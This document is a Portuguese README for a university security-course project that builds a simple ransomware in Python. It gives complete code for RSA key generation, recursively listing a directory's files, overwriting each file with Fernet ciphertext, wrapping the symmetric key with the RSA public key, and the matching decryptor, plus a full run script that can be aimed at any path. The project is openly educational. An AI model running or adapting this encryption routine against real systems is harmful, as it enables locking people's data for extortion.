# 👾 Ransomeware Simples

Trabalho para a disciplina de Segurança da Informação - PCS3544

## 🎈 Introdução

Este trabalho tem como objetivo demonstrar uma implementação didática de um ransomware simples utilizando a linguagem Python.

A base para a implementação desse ransomware é a utilização de algoritmos de criptografia assimétricos, isso é importante para dar controle sobre a cifração para o "atacante". Dessa forma, uma chave pública será utilizada para a cifração no dispositivo da "vítima", enquanto a chave privada correspondente ficaria em posse do "atacante".

Devido à limitação do tamanho dos dados que algoritmos assimétricos conseguem cifrar, não seria possível cifrar grandes arquivos, deste modo, se utilizará criptografia simétrica para realizar a encriptação dos arquivos da "vítima". Porém, para garantir o controle sobre os dados encriptados ao "atacante", se utilizará criptografia assimétrica para encriptar a chave utilizada na encriptação com o algoritmo simétrico.

## ➕ Dependências

Para rodar os programas recomenda-se a utilização de um ambiente virtual com o módulo [venv](https://docs.python.org/pt-br/3/library/venv.html#module-venv), onde serão instaladas as dependências e executados os programas.

Para instalar as dependências faça:

```bash
pip3 install cryptography
```

Ou faça:

```bash
pip3 install -r requirements.txt
```

## 📚 Entendendo o funcionamento

Para realizar um ataque, algumas etapas têm que ser executadas antes, sendo elas as seguintes:

1. Gerar a chave pública do algoritmo assimétrico
2. Gerar a chave privada do algoritmo assimétrico

Já durante o ataque, as seguintes etapas têm que ser realizadas:

1. Gerar uma chave simétrica
2. Encriptar arquivos da "vítima" com a chave simétrica
3. Ler a chave pública assimétrica
4. Encriptar chave simétrica utilizando a chave pública assimétrica

Após o ataque ter sido concluído e a decriptação tiver que ser realizadas, são executados os seguintes passos:

1. Ler a chave privada assimétrica
2. Decriptar a chave simétrica utilizando a chave privada assimétrica
3. Decriptar arquivos utilizando a chave simétrica

### Antes do ataque

Antes do ataque é necessário gerar as chaves que serão utilizadas pelo algoritmo de criptografia assimétrico, para isso se utilizará a implementação do algoritmo RSA da biblioteca `cryptography` do Python.

Sendo então necessário realizar a importação dos métodos que serão utilizados na geração das chaves.

```Python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
```

#### Gerando a chave privada assimétrica

Para gerar a chave privada é possível utilizar a função `rsa.generate_private_key`, definindo o `public_exponent` como `65537` e o tamanho da chave como `2048`.

> O `public_exponent` deve ser um número primo positivo, de preferência um número primo grande. Neste trabalho foi utilizado o número `65537` por ser o número normalmente utilizado em criptografias utilizando o RSA. Esse número é utilizado, principalmente, por razões históricas, uma vez que implementações anteriores do RSA que utilizavam expoentes muito pequenos eram mais vulneráveis, enquanto a utilização de expoentes muito elevados exigiam um poder computacional muito grande. Esse número também é conhecido como o número de Fermat (Fn = 2^[2^(n)] + 1), com n = 4.

```Python
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
```

Após gerar a chave, para utilizá-la posteriormente é necessário serializá-la e salvá-la em um arquivo `.pem`.

```Python
serial_private = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

with open("private_asym_key.pem", "wb") as file:
    file.write(serial_private)
```

#### Gerando a chave pública assimétrica

A chave pública, por sua vez, será gerada por meio da chave privada gerada anteriormente. Para isso será necessário executar o seguinte comando:

```Python
public_key = private_key.public_key()
```

Então, assim como foi feito para a chave privada, para que se possa utilizar a chave posteriormente, será necessário serializá-la e salvá-la em um arquivo `.pem`.

```Python
serial_pub = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open("public_asym_key.pem", "wb") as file:
    file.write(serial_pub)
```

### Método útil para durante e depois do ataque

Tanto para conseguir encriptar os arquivos da "vítima" durante o ataque, quanto para decriptá-los depois do ataque, é necessário conseguir listar todos os arquivos que serão afetados, para isso é interessante definir uma função que liste todos esses arquivos, a qual pode ser definida como mostra a seguir:

```Python
import os

def list_files(base_dir):
    all_files = []

    for path, _, files in os.walk(base_dir):
        for name in files:
            all_files.append(os.path.join(path, name))

    return all_files
```

### Durante o ataque

Assim como para gerar as chaves, para gerar a chave simétrica e realizar as encriptações necessárias se utilizará a biblioteca `cryptography` do Python.

Sendo então necessário realizar a importação dos métodos que serão utilizados em todos os procedimentos durante o ataque.

É importante ressaltar que o algoritmo simétrico a ser utilizado nos passos a seguir é o algoritmo de Fernet.

```Python
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
```

#### Gerando a chave simétricas

Para gerar a chave, é necessário utilizar o método `Fernet.generate_key()`:

```Python
def generate_sym_key():
    key = Fernet.generate_key()
    return key
```

#### Encriptando os arquivos

Tendo-se a chave simétrica gerada anteriormente, é possível encriptar os dados de um arquivo com o método `Fernet(key).encrypt`. Para isso então é necessário primeiramente abrir o arquivo a ser encriptado, então ler seu conteúdo, encriptar seu conteúdo e por fim escrever esse conteúdo de volta no arquivo lido.

```Python
def encrypt_file(filename, key):
    with open(filename, "rb") as file_to_encrypt:
        file_data = file_to_encrypt.read()

    encrypted_data = Fernet(key).encrypt(file_data)

    with open(filename, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)
```

#### Lendo a chave pública assimétrica

Para que se possa encriptar a chave simétrica gerada utilizando a chave pública assimétrica gerada anteriormente, é necessário primeiramente ler os dados do arquivo salvo da chave pública assimétrica e realizar a desserialização dos dados da chave.

```Python
def read_public_key(filename):
    with open(filename, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )

    return public_key
```

#### Encriptando a chave simétrica

Tendo-se a chave pública assimétrica e a chave simétrica, é possível utilizar o algoritmo SHA256 e a chave assimétrica para encriptar a chave simétrica e então salvar o arquivo encriptado para uso posterior.

```Python
def encrypt_sym_key(sym_key, public_key, sym_key_filename):
    encrypted_key = public_key.encrypt(
        sym_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(sym_key_filename, "wb") as encrypted_key_file:
        encrypted_key_file.write(encrypted_key)
```

#### Execução completa

Definindo todas as funções para todos os passos descritos anteriormente, é possível realizar a execução completa do funcionamento do ransomware da seguinte forma:

```Python
sym_key = generate_sym_key()

filenames_list = list_files("/caminho/até/o/diretório/com/arquivos/a/serem/encriptados")

for filename in filenames_list:
    encrypt_file(filename,  sym_key)

public_key = read_public_key("public_asym_key.pem")

encrypt_sym_key(sym_key, public_key, "sym_key.key")
```

### Após o ataque

Assim como para gerar as chaves e para a encriptação dos arquivos, para realizar as decriptações necessárias se utilizará a biblioteca `cryptography` do Python.

Sendo então necessário realizar a importação dos métodos que serão utilizados em todos os procedimentos no momento posterior ao ataque.

É importante ressaltar que, assim como foi utilizado o algoritmo simétrico de Fernet para realizar as encriptações dos arquivos, esse mesmo algoritmo será utilizado para as decriptações.

```Python
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
```

#### Lendo a chave privada assimétrica

Para que se possa decriptar a chave simétrica utilizada com a chave privada assimétrica gerada anteriormente, é necessário primeiramente ler os dados do arquivo salvo da chave privada assimétrica e realizar a desserialização dos dados da chave.

```Python
def read_private_key(filename):
    with open(filename, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
        )

    return private_key
```

#### Decriptando a chave simétrica

Tendo-se a chave privada assimétrica e lendo-se o arquivo da chave simétrica encriptada, é possível utilizar o algoritmo SHA256 e a chave assimétrica para decriptar os dados do arquivo da chave simétrica.

```Python
def decrypt_sym_key(sym_key_filename, private_key):
    with open(sym_key_filename, "rb") as encrypted_file:
        sym_key_file_data = encrypted_file.read()

    sym_key = private_key.decrypt(
        sym_key_file_data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return sym_key
```

#### Decriptando os arquivos

Tendo-se a chave simétrica decriptada, é possível decriptar os dados de um arquivo com o método `Fernet(key).decrypt`. Para isso então é necessário primeiramente abrir o arquivo encriptado, então ler seu conteúdo, decriptar seu conteúdo e por fim escrever esse conteúdo de volta no arquivo.

```Python
def decrypt_file(filename, key):
    with open(filename, "rb") as file_to_decrypt:
        file_data = file_to_decrypt.read()

    decrypted_data = Fernet(key).decrypt(file_data)

    with open(filename, "wb") as decrypted_file:
        decrypted_file.write(decrypted_data)
```

#### Execução completa

Definindo todas as funções para todos os passos descritos anteriormente, é possível realizar a execução completa do decriptador da seguinte forma:

```Python
private_key = read_private_key("private_asym_key.pem")

sym_key = decrypt_sym_key("sym_key.key", private_key)

filenames_list = list_files("/caminho/até/o/diretório/com/arquivos/a/serem/decriptados")

for filename in filenames_list:
    decrypt_file(filename,  sym_key)
```

## 🚀 Utilizando os scripts

É possível testar o funcionamento completo do programa com os script presentes neste repositório. Para esse teste, o alvo do ataque serão os arquivos presentes na pasta `agentes_secretos`, verifique o conteúdo dos arquivos antes de iniciar o processo.

Primeiramente, para gerar as chaves do algoritmo assimétrico, rode o seguinte comando no terminal:

```bash
python3 generate_keys.py
```

Então, para encriptar os arquivos faça:

```bash
python3 encrypt.py
```

Verifique agora o conteúdo dos arquivos, veja se é possível visualizar seus conteúdos.

Por fim, para decriptar os arquivos, rode o seguinte comando:

```bash
python3 decrypt.py
```
